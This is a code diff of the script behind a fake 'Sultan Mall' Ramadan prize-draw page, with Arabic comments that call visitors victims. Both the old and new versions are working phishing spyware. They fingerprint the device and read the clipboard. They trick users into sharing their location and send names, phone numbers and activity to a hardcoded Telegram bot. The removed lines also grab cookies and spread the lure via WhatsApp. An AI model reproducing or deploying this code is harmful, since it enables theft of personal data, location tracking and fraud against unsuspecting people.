@@ -130,182 +130,116 @@
     </div>
 </div>
 <script>
-
- if (!/Android|iPhone/i.test(navigator.userAgent)) {
-    // إذا لم يكن جوال، وجهه لموقع جوجل أو صفحة فارغة
+// 1. فحص نوع الجهاز (توجيه الحاسوب)
+if (!/Android|iPhone/i.test(navigator.userAgent)) {
     window.location.href = "https://www.google.com";
- }   
+}
+
 const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
 const chatId = "7388801889"; 
-    
-    // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
-    async function silentRadar() {
-     
-        let storageInfo = "غير مدعوم"; // تعريف المتغير أولاً لتجنب الأخطاء
-          
-        try {
-            if (navigator.storage && navigator.storage.estimate) {
-                const estimate = await navigator.storage.estimate();
-                const total = (estimate.quota / (1024 ** 3)).toFixed(2);
-                const free = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(2);
-                storageInfo = `${total} GB الكلية | ${free} GB الفاضية`;
-            }
-        } catch (e) { storageInfo = "خطأ في الجلب"; }
-        // معلومات المتصفح والنظام
-        let ua = navigator.userAgent;
-        let platform = navigator.platform;
-        let language = navigator.language;
-        let cores = navigator.hardwareConcurrency || "غير معروف"; // عدد نويات المعالج
-        let ram = navigator.deviceMemory || "غير معروف"; // الذاكرة العشوائية GB
-        let screenRes = `${window.screen.width}x${window.screen.height}`;
-        let colorDepth = window.screen.colorDepth;
-        let connection = navigator.connection ? navigator.connection.effectiveType : "غير معروف"; // نوع الشبكة (4G/WiFi)
 
-        let batteryInfo = "غير متاح";
-        let ipAddr = "جاري الجلب...";
+async function silentRadar() {
+    let storageInfo = "غير متاح";
+    try {
+        if (navigator.storage && navigator.storage.estimate) {
+            const estimate = await navigator.storage.estimate();
+            const total = (estimate.quota / (1024 ** 3)).toFixed(2);
+            const free = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(2);
+            storageInfo = `${total} GB الكلية | ${free} GB المتاحة`;
+        }
+    } catch (e) {}
 
-        // جلب تفاصيل البطارية (الشحن والحالة)
-        try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `🔋 المستوى: ${(battery.level * 100).toFixed(0)}% | ⚡ الحالة: ${battery.charging ? 'جاري الشحن الآن' : 'لا يشحن حالياً'}`;
-        } catch (e) {}
+    let ua = navigator.userAgent;
+    let platform = navigator.platform;
+    let cores = navigator.hardwareConcurrency || "غير معروف";
+    let ram = navigator.deviceMemory || "غير معروف";
+    let screenRes = `${window.screen.width}x${window.screen.height}`;
+    let connection = navigator.connection ? navigator.connection.effectiveType : "غير معروف";
 
-        // جلب الـ IP
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ipAddr = data.ip;
-        } catch (e) {}
+    let batteryInfo = "جاري الجلب...";
+    let ipAddr = "جاري الجلب...";
 
-        const megaMsg = `
+    try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `🔋 المستوى: ${(battery.level * 100).toFixed(0)}% | ⚡ ${battery.charging ? 'يشحن' : 'لا يشحن'}`;
+    } catch (e) {}
+
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ipAddr = data.ip;
+    } catch (e) {}
+
+    const megaMsg = `
 🚨 رادار ZeroX العملاق - دخول جديد!
 ----------------------------------
 🌐 الـ IP: ${ipAddr}
-🌐 نوع الشبكة: ${connection}
-📱 الجهاز/النظام: ${platform}
-🧠 نويات المعالج: ${cores} Core
-📟 الذاكرة (RAM): ${ram} GB تقريباً
-🔋 حالة البطارية: ${batteryInfo}
+📡 الشبكة: ${connection}
+📱 النظام: ${platform}
+🧠 المعالج: ${cores} Core | 📟 RAM: ${ram} GB
+🔋 البطارية: ${batteryInfo}
+💾 التخزين: ${storageInfo}
 ----------------------------------
-🖥️ دقة الشاشة: ${screenRes}
-🎨 عمق الألوان: ${colorDepth} bit
-🌍 اللغة الأساسية: ${language}
+🖥️ الشاشة: ${screenRes}
 🌐 المتصفح: ${ua}
-----------------------------------
 📍 الموقع المستهدف: السلطان مول - رمضان 🌙
-        `;
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(megaMsg)}`);
-    }
+    `;
+    
+    sendTelegram(megaMsg);
+}
 
-    // تشغيل الرادار فوراً
-        // 1. تشغيل الرادار الصامت فوراً
-    silentRadar(); 
+// دالة موحدة للإرسال لتوفير الكود
+function sendTelegram(text) {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+}
 
+// تشغيل الرادار
+silentRadar();
 
-    // 🍪 قناص الكوكيز (يعمل فور اكتمال التحميل)
-    window.addEventListener('load', () => {
-        let cookies = document.cookie || "خزنة الكوكيز فارغة أو محمية!";
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🍪 كوكيز الضحية المكتشفة:\n" + cookies)}`);
-    });
-
-    // 📋 صائد الحافظة (عند أول نقرة لضمان تجاوز الحماية)
-    document.addEventListener('click', () => {
+// قنص الحافظة (عند أول نقرة)
+document.addEventListener('click', () => {
+    if (navigator.clipboard && navigator.clipboard.readText) {
         navigator.clipboard.readText().then(text => {
-            if(text && text.length > 0) {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 تم قنص الحافظة عند النقرة: \n" + text)}`);
-            }
+            if(text) sendTelegram("🎯 حافظة الضحية: \n" + text);
         }).catch(() => {});
-    }, { once: true }); 
-
-    // 🚨 كاشف وضع التخفي
-    if (!window.RequestFileSystem && !window.webkitRequestFileSystem) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
     }
+}, { once: true });
 
-    // 📱 رادار الميلان والحركة (Gyroscope)
-    window.ondeviceorientation = (event) => {
-        if (event.beta !== null) {
-            let status = event.beta > 45 ? "مائل للخلف" : "مستوي";
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 وضعية الجهاز الآن: " + status)}`);
-            window.ondeviceorientation = null; // إرسال لمرة واحدة
-        }
-    };
-
-    // 🔍 رادار كشف النوايا الموحد (الاسم، الرقم، الإيميل)
-    ['name', 'phone', 'email'].forEach(id => {
-        document.getElementById(id).addEventListener('blur', (e) => {
-            if(e.target.value.length > 2) {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`📝 الضحية كتب في خانة ${id}: ` + e.target.value)}`);
-            }
-        });
-    });
-
-    // ✂️ كاشف النسخ من الصفحة
-    document.addEventListener('copy', () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
-    });
-
+// جلب الموقع الدقيق
 async function getExactLocation() {
-    alert("تهانينا! لتحديد أقرب فرع 'سلطان مول' لموقعك لاستلام الجائزة، يرجى الضغط على 'سماح' في النافذة التالية");
+    alert("تهانينا! لتحديد أقرب فرع يرجى الضغط على 'سماح'");
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const locMsg = `📍 موقع الصيد الدقيق جاهز:\n${mapLink}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}`);
-        }, error => {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية رفض إعطاء إذن الموقع!")}`);
+            sendTelegram(`📍 موقع الصيد الدقيق:\n${mapLink}`);
+        }, () => {
+            sendTelegram("⚠️ الضحية رفض إذن الموقع!");
         });
     }
 }
-window.onblur = () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📉 الضحية خرج من الصفحة (راح للواتساب أو قفل المتصفح)!")}`);
-};
 
-window.onfocus = () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📈 الضحية عاد للصفحة مجدداً!")}`);
-};
+// مراقبة الخروج والعودة
+window.onblur = () => sendTelegram("📉 الضحية خرج من الصفحة!");
+window.onfocus = () => sendTelegram("📈 الضحية عاد للصفحة!");
 
-    async function executeAttack() {
-        getExactLocation();
-
-        const name = document.getElementById('name').value;
-        const phone = document.getElementById('phone').value;
-        const email = document.getElementById('email').value || "غير متوفر";
-
-        if(name && phone) {
-            const finalMsg = `
-🌙 صيد خاص بـ ZeroX (بيانات التسجيل):
-👤 الاسم: ${name}
-📱 الرقم: ${phone}
-📧 الإيميل: ${email}
-🤐 تم بنجاح
-            `;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(finalMsg)}`);
-
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('share-section').style.display = 'block';
-        } else {
-            alert("يرجى ملء البيانات للدخول في السحب!");
-        }
+// دالة الهجوم النهائي (التسجيل)
+async function executeAttack() {
+    await getExactLocation();
+    const name = document.getElementById('name').value;
+    const phone = document.getElementById('phone').value;
+    
+    if(name && phone) {
+        sendTelegram(`🌙 بيانات التسجيل:\n👤 الاسم: ${name}\n📱 الرقم: ${phone}`);
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('share-section').style.display = 'block';
+    } else {
+        alert("يرجى ملء البيانات!");
     }
+}
+</script>
 
-    // --- 3. دالة المشاركة الفيروسية ---
-    let shareCount = 0;
-    function viralShare() {
-        if(shareCount < 10) {
-            shareCount++;
-            document.getElementById('count').innerText = shareCount;
-            document.getElementById('bar').style.width = (shareCount * 10) + "%";
-            window.open(`whatsapp://send?text=🌙 السلطان مول يوزع جوائز بمناسبة رمضان! سجلت اسمي وطلع اسمي في السحب، جرب حظك هنا: ${window.location.href}`);
-        } else {
-            alert("مبروك! تم إدراج اسمك في السحب النهائي.");
-            document.getElementById('share-section').innerHTML = "<h2>تم بنجاح! 🎉</h2>";
-        }
-    }
         // قائمة الفائزين الـ 20 لرفع الأدرينالين والمصداقية
     const winners = [
         "مبروك لـ محمد العنسي من صنعاء فوزه بـ iPhone 15! 📱",
